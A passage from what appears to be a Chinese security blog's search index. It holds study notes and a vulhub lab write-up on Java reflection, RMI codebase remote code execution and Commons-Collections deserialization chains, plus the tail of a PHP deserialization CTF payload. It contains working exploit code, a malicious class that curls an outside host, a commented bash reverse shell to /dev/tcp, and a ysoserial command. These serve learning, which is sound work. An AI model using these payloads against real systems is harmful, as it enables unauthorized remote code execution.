闭合，我就很纳闷，我平时序列化都是末尾才会有这个括号，后来经过验证，只要是数组，都会单独有个闭合。\npayload\nwherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;\n\n","categories":["CTF","BUUCTF"],"tags":["反序列化"]},{"title":"Java安全学习笔记（一）","url":"/2021/11/02/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/","content":"反射\nJava中对象可以通过反射获取他的类，类可以通过反射拿到所有方法（包括私有），拿到的方法可以调用，总之通过“反射”，我们可以将Java这种静态语言附加上动态特性。（P神的定义）\n\n反射中几位重要的方法\n获取类的方法：forname\n实例化类对象的方法：newInstance\n获取函数的方法：getMethod\n执行函数的方法：invoke\n\n获取类的三种方式\nobj.getClass() 如果上下文中存在某个类的实例obj，那么我们可以直接通过obj.getClass()来获取它的类。\nRuntime runtime = Runtime.getRuntime();        System.out.println(runtime.getClass());// class java.lang.Runtime\n\n\n\n\n\n\nTest.class 如果你已经加载了某个类，只是想获取到它的 java.lang.Class 对象，那么就直接 拿它的 class 属性即可。这个⽅法其实不属于反射。\n\nClass.forName 如果你知道某个类的名字，想获取到这个类，就可以使⽤ forName 来获取\nClass clazz = Class.forName(\"java.lang.Runtime\");        System.out.println(clazz);// class java.lang.Runtime\n\n\n\n\n\n使用newInstance不成功的一些原因\n你使用的类没有无参构造函数\n你使用的类构造函数是私有的\n\n案例\nClass clazz = Class.forName(\"java.lang.Runtime\");clazz.getMethod(\"exec\", String.class).invoke(clazz.newInstance(), \"whoami\");\n\n会报错\n原因是Runtime类的构造方法是私有的\n可以这样\nClass clazz = Class.forName(\"java.lang.Runtime\");clazz.getMethod(\"exec\", String.class).invoke(clazz.getMethod(\"getRuntime\").invoke(clazz), \"calc.exe\");\n\ngetMethod的作用是通过反射获取一个类的特定的公有方法。\ninvoke的作用是执行方法，它的第一个参数是：\n\n如果这个方法是一个普通方法，那么第一个参数是类对象 \n如果这个方法是一个静态方法，那么第一个参数是类\n\n上述命令执行的payload可以分解为\nClass clazz = Class.forName(\"java.lang.Runtime\");Method exec = clazz.getMethod(\"exec\", String.class);Method getRuntimeMethod = clazz.getMethod(\"getRuntime\");Object runtime = getRuntimeMethod.invoke(clazz);exec.invoke(runtime, \"calc.exe\");\n\n到这里P神提出了两个疑问\n\n如果一个类没有无参构造方法，也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类 呢？ \n如果一个方法或构造方法是私有方法，我们是否能执行它呢？\n\n第一个问题的解决方式，需要用到一个新的放射方法getConstructor\n\n和 getMethod 类似， getConstructor 接收的参数是构造函数列表类型，因为构造函数也支持重载， 所以必须用参数列表类型才能唯一确定一个构造函数。 获取到构造函数后，我们使用 newInstance 来执行。\n\nProcessBuilder有两个构造函数\n\npublic ProcessBuilder(List command) \npublic ProcessBuilder(String… command)\n\n用第一种形式\n主要传入List.class\nClass clazz = Class.forName(\"java.lang.ProcessBuilder\");            ((ProcessBuilder)clazz.getConstructor(List.class).newInstance(Arrays.asList(\"calc.exe\"))).start();\n\n利用反射的方式\nClass clazz = Class.forName(\"java.lang.ProcessBuilder\");            clazz.getMethod(\"start\").invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(\"calc.exe\")));\n\n第二种形式\n主要传入String[].class\nClass clazz = Class.forName(\"java.lang.ProcessBuilder\");        ((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(new String[][]&#123;&#123;\"calc.exe\"&#125;&#125;)).start();\n\n反射的方式\nClass clazz = Class.forName(\"java.lang.ProcessBuilder\");clazz.getMethod(\"start\").invoke(clazz.getConstructor(String[].class).newInstance(new String[][]&#123;&#123;\"calc.exe\"&#125;&#125;));\n\n第二个问题：如果一个方法或构造方法是私有方法，我们是否能执行它呢？\n解决方式是getDeclared系列的反射，它与普通的getMethod、getConstructor区别是：\n\ngetMethod 系列方法获取的是当前类中所有公共方法，包括从父类继承的方法 \ngetDeclaredMethod 系列方法获取的是当前类中“声明”的方法，是实在写在这个类里的，包括私 有的方法，但从父类里继承来的就不包含了\n\n实现代码\nClass clazz = Class.forName(\"java.lang.Runtime\");        Constructor exec = clazz.getDeclaredConstructor();        exec.setAccessible(true);        clazz.getMethod(\"exec\", String.class).invoke(exec.newInstance(), \"calc.exe\");\n\n\n这里使用了一个方法 setAccessible ，这个是必须的。我们在获取到一个私有方法后，必须用 setAccessible 修改它的作用域，否则仍然不能调用。\n\nRMI\nRMI全称是Remote Method Invocation，远程方法调用。\n\nRMI Server\npackage org.vulhub.RMI;import java.rmi.Naming;import java.rmi.Remote;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import java.rmi.server.UnicastRemoteObject;public class RmiServer &#123;       // interface继承自interface使用extends    // interface 代表这个类没有字段 全是方法     // ⼀个继承了 java.rmi.Remote 的接⼝ 其中定义了我们要调用的类    public interface IRemoteHelloWorld extends Remote &#123;        // 这一句是什么意思？        public String hello() throws RemoteException;    &#125;    // extends 继承关键字    // 使用 implements 关键字可以变相的使java具有多继承的特性    // throw和throws就是异常相关的关键字    public class RemoteHelloWorld extends UnicastRemoteObject implements IRemoteHelloWorld &#123;        protected RemoteHelloWorld() throws RemoteException &#123;            super();        &#125;        // 定义我们要远程调⽤的函数        public String hello() throws RemoteException &#123;            System.out.println(\"call from\");            return \"Hello world\";        &#125;    &#125;    // ⼀个主类，⽤来创建Registry    private void start() throws Exception &#123;        RemoteHelloWorld h = new RemoteHelloWorld();        LocateRegistry.createRegistry(1099);        Naming.rebind(\"rmi://127.0.0.1:1099/Hello\", h);    &#125;    public static void main(String[] args) throws Exception &#123;        new RmiServer().start();    &#125;&#125;\n\n一个RMI Server分为三部分\n\n一个继承了java.rmi.Remote的接口，其中定义我们要远程调用的函数，比如这里的hello()\n一个实现了此接口的类\n一个主类，用来创建Register，并将上面的类实例化后绑定到一个地址，这就是我们所谓的Server了。\n\nRMI Client\npackage org.vulhub.Train;import org.vulhub.RMI.RMIServer;import java.rmi.Naming;import java.rmi.NotBoundException;import java.rmi.RemoteException;public class TrainMain &#123; public static void main(String[] args) throws Exception &#123; // 使⽤ Naming.lookup 在Registry中寻找到名字是Hello的对象 RMIServer.IRemoteHelloWorld hello = (RMIServer.IRemoteHelloWorld)Naming.lookup(\"rmi://172.20.10.1:1099/Hello\"); String ret = hello.hello(); System.out.println( ret); &#125;&#125;\n\n\n客户端就简单多了，使⽤ Naming.lookup 在Registry中寻找到名字是Hello的对象，后⾯的使⽤就和在 本地使⽤⼀样了。 虽说执⾏远程⽅法的时候代码是在远程服务器上执⾏的，但实际上我们还是需要知道有哪些⽅法，这时 候接⼝的重要性就体现了，这也是为什么我们前⾯要继承 Remote 并将我们需要调⽤的⽅法写在接⼝ IRemoteHelloWorld ⾥，因为客户端也需要⽤到这个接⼝。\n\n一个RMI过程有以下三个参与者：\n\nRMI Registey\nRMI Server\nRMI Client\n\n如何攻击RMI Registry？\nJava对远程访问RMI Registry做了限制，只有来源地址是localhost的时候，才能调用rebind、 bind、unbind等方法。 不过list和lookup方法可以远程调用。 list方法可以列出目标上所有绑定的对象：\n\n// list方法可以列出目标上所有绑定的对象        String[] s = Naming.list(\"rmi://172.20.10.131:1099\");        for (int i = 0; i &lt; s.length; i++) &#123;            System.out.println(s[i]);        &#125;\n\n// lookup作用就是获得某个远程对象        RmiServer.IRemoteHelloWorld hello = (RmiServer.IRemoteHelloWorld)Naming.lookup(\"rmi://172.20.10.131:1099/Hello\");        String ret = hello.hello();        System.out.println( ret);\n\nRMI利用codebase执行任意代码有满足如下条件的RMI服务器才能被攻击：\n\n安装并配置了SecurityManager \nJava版本低于7u21、6u45，或者设置了 java.rmi.server.useCodebaseOnly=false 其中 java.rmi.server.useCodebaseOnly 是在Java 7u21、6u45的时候修改的一个默认设置： https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html https://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html\n\n复现代码\n// ICalc.javaimport java.rmi.Remote;import java.rmi.RemoteException;import java.util.List;public interface ICalc extends Remote &#123;    public Integer sum(List&lt;Integer&gt; params) throws RemoteException;&#125;// Calc.javaimport java.rmi.Remote;import java.rmi.RemoteException;import java.util.List;import java.rmi.server.UnicastRemoteObject;public class Calc extends UnicastRemoteObject implements ICalc &#123;    public Calc() throws RemoteException &#123;&#125;    public Integer sum(List&lt;Integer&gt; params) throws RemoteException &#123;        Integer sum = 0;        for (Integer param : params) &#123;            sum += param;        &#125;        return sum;    &#125;&#125;// RemoteRMIServer.javaimport java.rmi.Naming;import java.rmi.Remote;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.server.UnicastRemoteObject;import java.util.List;public class RemoteRMIServer &#123;    private void start() throws Exception &#123;        if (System.getSecurityManager() == null) &#123;            System.out.println(\"setup SecurityManager\");            System.setSecurityManager(new SecurityManager());        &#125;        Calc h = new Calc();        LocateRegistry.createRegistry(1099);        Naming.rebind(\"refObj\", h);    &#125;    public static void main(String[] args) throws Exception &#123;        new RemoteRMIServer().start();    &#125;&#125;    // client.policygrant &#123;    permission java.security.AllPermission;&#125;;\n\n编译及运行\njavac *.javajava -Djava.rmi.server.hostname=172.20.10.131 -Djava.rmi.server.useCodebaseOnly=false -Djava.security.policy=client.policy RemoteRMIServer\n\n建立一个RMIClient.java：\nimport java.rmi.Naming;import java.util.List;import java.util.ArrayList;import java.io.Serializable;public class RMIClient implements Serializable &#123;    public class Payload extends ArrayList&lt;Integer&gt; &#123;    &#125;    public void lookup() throws Exception &#123;        ICalc r = (ICalc)                Naming.lookup(\"rmi://172.20.10.131:1099/refObj\");        List&lt;Integer&gt; li = new Payload();        li.add(3);        li.add(4);        System.out.println(r.sum(li));    &#125;    public static void main(String[] args) throws Exception &#123;        new RMIClient().lookup();    &#125;&#125;\n\n\n这个Client我们需要在另一个位置运行，因为我们需要让RMI Server在本地CLASSPATH里找不到类，才 会去加载codebase中的类，所以不能将RMIClient.java放在RMI Server所在的目录中。\n\n运行RMIClient：\njava -Djava.rmi.server.useCodebaseOnly=false -Djava.rmi.server.codebase=http://example.com/ RMIClient\n\n\n我们只需要编译一个恶意类，将其class文件放置在Web服务器的 /RMIClient$Payload.class 即可。\n\n恶意类\nimport java.rmi.Naming;import java.util.List;import java.util.ArrayList;import java.io.Serializable;public class RMIClient implements Serializable &#123;    private static final long serialVersionUID = 1L;    static &#123;        try&#123;            Runtime.getRuntime().exec(\"touch /tmp/Success\");        &#125; catch (Exception e)&#123;            e.printStackTrace();        &#125;    &#125;    public class Payload extends ArrayList&lt;Integer&gt;    &#123;&#125;    public void lookup() throws Exception &#123;        ICalc r = (ICalc)                Naming.lookup(\"rmi://172.20.10.131:1099/refObj\");        List&lt;Integer&gt; li = new Payload();        li.add(3);        li.add(4);        System.out.println(r.sum(li)); &#125;    public static void main(String[] args) throws Exception &#123;        new RMIClient().lookup();    &#125;&#125;\n\n\n想知道原理，可以通过抓包来查看RMI做了什么，跟着P神文章做了一遍，通过wireshark抓包，抓到一些进行了序列化的数据，用GitHub - NickstaDB/SerializationDumper: A tool to dump Java serialization streams in a more human readable form. 工具查看序列化数据，但是看不懂。\n\n反序列化Java、php、Python反序列化有什么异同?\n\nJava的反序列化和PHP的反序列化其实有点类似，他们都只能将一个对象中的属性按照某种特定的格式 生成一段数据流，在反序列化的时候再按照这个格式将属性拿回来，再赋值给新的对象。 但Java相对PHP序列化更深入的地方在于，其提供了更加高级、灵活地方法 writeObject ，允许开发者 在序列化流中插入一些自定义数据，进而在反序列化的时候能够使用 readObject 进行读取。 当然，PHP中也提供了一个魔术方法叫 __wakeup ，在反序列化的时候进行触发。很多人会认为Java的 readObject 和PHP的 __wakeup 类似，但其实不全对，虽然都是在反序列化的时候触发，但他们解决 的问题稍微有些差异。 Java设计 readObject 的思路和PHP的 __wakeup 不同点在于： readObject 倾向于解决“反序列化时如 何还原一个完整对象”这个问题，而PHP的 __wakeup 更倾向于解决“反序列化后如何初始化这个对象”的 问题。\n\nPHP反序列化Java反序列化Python反序列化ysoserial工具https://github.com/frohoff/ysoserial\n生成CommonsCollections利用poc\njava -jar ysoserial-master-30099844c6-1.jar CommonsCollections1 &quot;id&quot;\n\nURLDNSURLDNS 就是ysoserial中⼀个利⽤链的名字，但准确来说，这个其实不能称作“利⽤链”。因为其参数不 是⼀个可以“利⽤”的命令，⽽仅为⼀个URL，其能触发的结果也不是命令执⾏，⽽是⼀次DNS请求。 虽然这个“利⽤链”实际上是不能“利⽤”的，但因为其如下的优点，⾮常适合我们在检测反序列化漏洞时 使⽤： \n\n使⽤Java内置的类构造，对第三⽅库没有依赖 \n在⽬标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞\n\ncommon-collectionspoc1\npackage org.vulhub.Ser;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.util.HashMap;import java.util.Map;public class CommonCollections1 &#123;    public static void main(String[] args) throws Exception &#123;        // Transformer是⼀个接⼝，它只有⼀个待实现的⽅法        Transformer[] transformers = new Transformer[]&#123;                // ConstantTransformer是实现了Transformer接⼝的⼀个类，它的过程就是在构造函数的时候传⼊⼀个                //对象，并在transform⽅法将这个对象再返回                // 所以他的作⽤其实就是包装任意⼀个对象，在执⾏回调时返回这个对象，进⽽⽅便后续操作                new ConstantTransformer(Runtime.getRuntime()),                // InvokerTransformer是实现了Transformer接⼝的⼀个类，这个类可以⽤来执⾏任意⽅法，这也是反序                //列化能执⾏任意代码的关键。                // 在实例化这个InvokerTransformer时，需要传⼊三个参数，第⼀个参数是待执⾏的⽅法名，第⼆个参数                //是这个函数的参数列表的参数类型，第三个参数是传给这个函数的参数列表                new InvokerTransformer(\"exec\", new Class[]&#123;String.class&#125;,                new Object[]&#123;\"calc.exe\"&#125;),        &#125;;        // ChainedTransformer也是实现了Transformer接⼝的⼀个类，它的作⽤是将内部的多个Transformer串        //在⼀起。通俗来说就是，前⼀个回调返回的结果，作为后⼀个回调的参数传⼊，        Transformer transformerChain = new                ChainedTransformer(transformers);        Map innerMap = new HashMap();        // TransformedMap⽤于对Java标准数据结构Map做⼀个修饰，被修饰过的Map在添加新的元素时，将可        //以执⾏⼀个回调。        Map outerMap = TransformedMap.decorate(innerMap, null,                transformerChain);        // 触发执行Transformer回调        outerMap.put(\"test\", \"xxxx\");    &#125;&#125;\n\npoc2\npackage org.vulhub.Ser;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.annotation.Retention;import java.lang.reflect.Constructor;import java.util.HashMap;import java.util.Map;public class CommonCollections2 &#123;    public static void main(String[] args) throws Exception &#123;        // 反序列化 不能序列化Runtime 因为没有实现 java.io.Serializeable//        Method f = Runtime.class.getMethod(\"getRuntime\");//        Runtime r = (Runtime) f.invoke(null);//        r.exec(\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\");        // Transformer是⼀个接⼝，它只有⼀个待实现的⽅法        Transformer[] transformers = new Transformer[] &#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(\"getMethod\", new Class[] &#123; String.class,                        Class[].class &#125;, new                        Object[] &#123; \"getRuntime\",                        new Class[0] &#125;),                new InvokerTransformer(\"invoke\", new Class[] &#123; Object.class,                        Object[].class &#125;, new                        Object[] &#123; null, new Object[0] &#125;),                new InvokerTransformer(\"exec\", new Class[] &#123; String.class &#125;,                        new String[] &#123;                                \"calc.exe\" &#125;),        &#125;;        // ChainedTransformer也是实现了Transformer接⼝的⼀个类，它的作⽤是将内部的多个Transformer串        //在⼀起。通俗来说就是，前⼀个回调返回的结果，作为后⼀个回调的参数传⼊，        Transformer transformerChain = new                ChainedTransformer(transformers);        Map innerMap = new HashMap();        innerMap.put(\"test\", \"xxxx\");        innerMap.put(\"value\", \"xxxx\");        // TransformedMap⽤于对Java标准数据结构Map做⼀个修饰，被修饰过的Map在添加新的元素时，将可        //以执⾏⼀个回调。        Map outerMap = TransformedMap.decorate(innerMap, null,                transformerChain);        // 触发执行Transformer回调        //        outerMap.put(\"test\", \"xxxx\");        Class clazz = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);        constructor.setAccessible(true);        Object obj = constructor.newInstance(Retention.class, outerMap);        // 序列化        ByteArrayOutputStream barr = new ByteArrayOutputStream();        ObjectOutputStream oos = new ObjectOutputStream(barr);        oos.writeObject(obj);        oos.close();        System.out.println(barr);        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));        Object o = (Object) ois.readObject();    &#125;&#125;\n\n小结看了URLDNS和common-collections这两条链子的利用和原理，利用倒是会了，原理确实是看不懂，也许是因为没有java相关的底子，我不知道是不是该继续看下去，因为确实挺费劲的，因为上次ctf题碰到java反序列化的题，做不起，所有才来学习java反序列化，但是java反序列化的坑很深，也并非一周两周就能够掌握，迷茫了。目前想法就是，找些环境来实践，先不管原理，先会利用起来，至少ctf中遇到能做得起。\nJava RMI codebase 远程代码执行漏洞复现复现步骤https://vulhub.org/#/environments/java/rmi-codebase/\n使用Docker拉取漏洞环境\nroot@VM-0-12-ubuntu:/home/ubuntu/vulhub-master/java/rmi-codebase# docker-compose build/usr/local/lib/python2.7/dist-packages/paramiko/transport.py:33: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.  from cryptography.hazmat.backends import default_backendBuilding rmiStep 1/9 : FROM openjdk:8u222-jdk ---&gt; fcb6c0ce31f9Step 2/9 : LABEL maintainer=\"phithon &lt;root@leavesongs.com&gt;\" ---&gt; Using cache ---&gt; 68434cb7eb62Step 3/9 : ENV RMIIP=\"127.0.0.1\" ---&gt; Using cache ---&gt; 57428be9e0eaStep 4/9 : COPY src/ /usr/src/ ---&gt; 0511fe1104fcStep 5/9 : WORKDIR /usr/src ---&gt; Running in 5bb6dbc8842cRemoving intermediate container 5bb6dbc8842c ---&gt; 81322e0babb4Step 6/9 : RUN set -ex     &amp;&amp; javac *.java ---&gt; Running in 985d742f1604+ javac Calc.java ICalc.java RemoteRMIServer.javaRemoving intermediate container 985d742f1604 ---&gt; 679d43986c84Step 7/9 : EXPOSE 1099 ---&gt; Running in 1601dc557ad0Removing intermediate container 1601dc557ad0 ---&gt; e2d1bb14a7abStep 8/9 : EXPOSE 64000 ---&gt; Running in 62b7eb3c5affRemoving intermediate container 62b7eb3c5aff ---&gt; 9da81fd4e87cStep 9/9 : CMD [\"bash\", \"-c\", \"java -Djava.rmi.server.hostname=$&#123;RMIIP&#125; -Djava.rmi.server.useCodebaseOnly=false -Djava.security.policy=client.policy RemoteRMIServer\"] ---&gt; Running in a66f149ea8b5Removing intermediate container a66f149ea8b5 ---&gt; d58e781c5c25Successfully built d58e781c5c25Successfully tagged rmi-codebase_rmi:latest\n\n启动环境\ndocker-compose run -e RMIIP=your-ip -p 1099:1099 -p 64000:64000 rmi\n\nroot@VM-0-12-ubuntu:/home/ubuntu/vulhub-master/java/rmi-codebase# docker-compose run -e RMIIP=xx.xx.xx.xx -p 1099:1099 -p 64000:64000 rmi/usr/local/lib/python2.7/dist-packages/paramiko/transport.py:33: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.  from cryptography.hazmat.backends import default_backendsetup SecurityManager\n\n\n因为是在云服务器上，执行反弹shell的话，无法反弹到本地主机，所以这里准备执行一条命令curl http://xx.xx.xx.xx:8000/exp 来验证命令是否被执行\n\n首先构造一个恶意类\nRMIClient.java\nimport java.rmi.Naming;import java.util.List;import java.util.ArrayList;import java.io.Serializable;public class RMIClient implements Serializable &#123;    private static final long serialVersionUID = 1L;    static &#123;        try&#123;//            Runtime.getRuntime().exec(new String[]&#123;\"bash\",\"-c\",\"bash -i &gt;&amp; /dev/tcp/172.20.10.1/4444 0&gt;&amp;1\"&#125;);            Runtime.getRuntime().exec(\"curl xx.xx.xx.xx:8000/exp\");        &#125; catch (Exception e)&#123;            e.printStackTrace();        &#125;    &#125;    public class Payload extends ArrayList&lt;Integer&gt;    &#123;&#125;    public void lookup() throws Exception &#123;        ICalc r = (ICalc)                Naming.lookup(\"rmi://xx.xx.xx.xx:1099/refObj\");        List&lt;Integer&gt; li = new Payload();        li.add(3);        li.add(4);        System.out.println(r.sum(li)); &#125;    public static void main(String[] args) throws Exception &#123;        new RMIClient().lookup();    &#125;&#125;// xx.xx.xx.xx 替换成云服务器地址\n\n编译 \njavac RMIClient.java\n\n会得到两个文件RMIClient$Payload.class 和 RMIClient.class\n\n然后将这两个文件上传至云服务器，用python3 -m http.server 启动一个http服务器进行监听。\nubuntu@VM-0-12-ubuntu:~/Temp$ ls RMIClient.class  'RMIClient$Payload.class'ubuntu@VM-0-12-ubuntu:~/Temp$ python3 -m http.serverServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...\n\n\n之所以这样做是因为正常执行的时候，我们可以通过-Djava.rmi.server.codebase=http://xx.xx.xx.xx/控制codebase\n\n而这个codebase有什么作用呢？\nP神说的\n\n既然这个Java系列的文章要尽量全面地梳理Java知识，我们不妨将时间线拉的久远一些……曾经有段时间，Java是可以运行在浏览器中的，对，就是Applet这个奇葩。在使用Applet的时候通常需要指定一个codebase属性，比如：\n&gt; &lt;applet code=\"HelloWorld.class\" codebase=\"Applets\" width=\"800\" height=\"600\"&gt;&gt; &lt;/applet&gt;&gt;\n\n\n除了Applet，RMI中也存在远程加载的场景，也会涉及到codebase。\ncodebase是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类，有点像我们日常用的CLASSPATH，但CLASSPATH是本地路径，而codebase通常是远程URL，比如http、ftp等。\n如果我们指定 codebase=http://example.com/ ，然后加载 org.vulhub.example.Example 类，则Java虚拟机会下载这个文件 http://example.com/org/vulhub/example/Example.class ，并作为Example类的字节码。\nRMI的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻找类。如果某一端反序列化时发现一个对象，那么就会去自己的CLASSPATH下寻找想对应的类；如果在本地没有找到这个类，就会去远程加载codebase中的类。\n这个时候问题就来了，如果codebase被控制，我们不就可以加载恶意类了吗？\n对，在RMI中，我们是可以将codebase随着序列化数据一起传输的，服务器在接收到这个数据后就会去CLASSPATH和指定的codebase寻找类，由于codebase被控制导致任意命令执行漏洞。\n\n接下来使用一个正常的客户端进行连接\nimport java.rmi.Naming;import java.util.List;import java.util.ArrayList;import java.io.Serializable;public class RMIClient implements Serializable &#123;    public class Payload extends ArrayList&lt;Integer&gt; &#123;    &#125;    public void lookup() throws Exception &#123;        ICalc r = (ICalc)                Naming.lookup(\"rmi://xx.xx.xx.xx:1099/refObj\");        List&lt;Integer&gt; li = new Payload();        li.add(3);        li.add(4);        System.out.println(r.sum(li));    &#125;    public static void main(String[] args) throws Exception &#123;        new RMIClient().lookup();    &#125;&#125;\n\n先编译\njavac RMIClient.javajava -Djava.rmi.server.useCodebaseOnly=false -Djava.rmi.server.codebase=http://example.com/ RMIClient\n\n这里的  http://example.com/ 就是刚刚python监听的地址\nF:\\Code\\JAVA\\RMI2\\src&gt;javac RMIClient.javaF:\\Code\\JAVA\\RMI2\\src&gt;java -Djava.rmi.server.useCodebaseOnly=false -Djava.rmi.server.codebase=http://xx.xx.xx.xx:8000/ RMIClientException in thread \"main\" java.rmi.ServerException: RemoteException occurred in server thread; nested exception is:        java.rmi.UnmarshalException: error unmarshalling arguments; nested exception is:        java.io.InvalidClassException: RMIClient; local class incompatible: stream classdesc serialVersionUID = -2981438248522607595, local class serialVersionUID = 1        at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:389)        at sun.rmi.transport.Transport$1.run(Transport.java:200)        at sun.rmi.transport.Transport$1.run(Transport.java:197)        at java.security.AccessController.doPrivileged(Native Method)        at sun.rmi.transport.Transport.serviceCall(Transport.java:196)        at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:573)        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:834)        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0(TCPTransport.java:688)        at java.security.AccessController.doPrivileged(Native Method)        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:687)        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)        at java.lang.Thread.run(Thread.java:748)        at sun.rmi.transport.StreamRemoteCall.exceptionReceivedFromServer(StreamRemoteCall.java:275)        at sun.rmi.transport.StreamRemoteCall.executeCall(StreamRemoteCall.java:252)        at sun.rmi.server.UnicastRef.invoke(UnicastRef.java:161)        at java.rmi.server.RemoteObjectInvocationHandler.invokeRemoteMethod(RemoteObjectInvocationHandler.java:194)        at java.rmi.server.RemoteObjectInvocationHandler.invoke(RemoteObjectInvocationHandler.java:148)        at com.sun.proxy.$Proxy0.sum(Unknown Source)        at RMIClient.lookup(RMIClient.java:16)        at RMIClient.main(RMIClient.java:20)Caused by: java.rmi.UnmarshalException: error unmarshalling arguments; nested exception is:        java.io.InvalidClassException: RMIClient; local class incompatible: stream classdesc serialVersionUID = -2981438248522607595, local class serialVersionUID = 1        at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:348)        at sun.rmi.transport.Transport$1.run(Transport.java:200)        at sun.rmi.transport.Transport$1.run(Transport.java:197)        at java.security.AccessController.doPrivileged(Native Method)        at sun.rmi.transport.Transport.serviceCall(Transport.java:196)        at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:573)        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:834)        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0(TCPTransport.java:688)        at java.security.AccessController.doPrivileged(Native Method)        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:687)        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)        at java.lang.Thread.run(Thread.java:748)Caused by: java.io.InvalidClassException: RMIClient; local class incompatible: stream classdesc serialVersionUID = -2981438248522607595, local class serialVersionUID = 1        at java.io.ObjectStreamClass.initNonProxy(ObjectStreamClass.java:699)        at java.io.ObjectInputStream.readNonProxyDesc(ObjectInputStream.java:1885)        at java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1751)        at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2042)        at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1573)        at java.io.ObjectInputStream.defaultReadFields(ObjectInputStream.java:2287)        at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2211)        at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2069)        at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1573)        at java.io.ObjectInputStream.readObject(ObjectInputStream.java:431)        at sun.rmi.server.UnicastRef.unmarshalValue(UnicastRef.java:322)        at sun.rmi.server.UnicastServerRef.unmarshalParametersUnchecked(UnicastServerRef.java:629)        at sun.rmi.server.UnicastServerRef.unmarshalParameters(UnicastServerRef.java:617)        at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:338)        ... 12 more\n\n可以看到这里报了很多错误，但是没有关系，因为我们的命令已经成功执行。\n看看刚刚python监听的日志\nubuntu@VM-0-12-ubuntu:~/Temp$ python3 -m http.serverServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...121.4.65.44 - - [06/Nov/2021 12:11:43] \"GET /RMIClient$Payload.class HTTP/1.1\" 200 -121.4.65.44 - - [06/Nov/2021 12:11:43] \"GET /RMIClient.class HTTP/1.1\" 200 -121.4.65.44 - - [06/Nov/2021 12:11:43] code 404, message File not found121.4.65.44 - - [06/Nov/2021 12:11:43] \"GET /exp HTTP/1.1\" 404 -\n\n这里不仅读取了RMIClient$Payload.class和RMIClient.class文件，还请求了/exp ，说明成功执行了命令。\n复现完成。\n以下复现主要学习ysoserial工具的使用\nJava RMI Registry 反序列化漏洞(&lt;=jdk8u111)搭建环境https://vulhub.org/#/environments/java/rmi-registry-bind-deserialization/\ndocker-compose builddocker-compose run -e RMIIP=your-ip -p 1099:1099 rmi\n\nroot@VM-0-12-ubuntu:/home/ubuntu/vulhub-master/java/rmi-registry-bind-deserialization# docker-compose build/usr/local/lib/python2.7/dist-packages/paramiko/transport.py:33: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.  from cryptography.hazmat.backends import default_backendBuilding rmiStep 1/12 : FROM maven:3-jdk-8 AS builder ---&gt; cf7c6bc6ea12Step 2/12 : LABEL MAINTAINER=\"phithon &lt;root@leavesongs.com&gt;\" ---&gt; Using cache ---&gt; 828f56e5b565Step 3/12 : COPY ./src/code/ /usr/src/ ---&gt; Using cache ---&gt; 004e82609029Step 4/12 : WORKDIR /usr/src ---&gt; Using cache ---&gt; 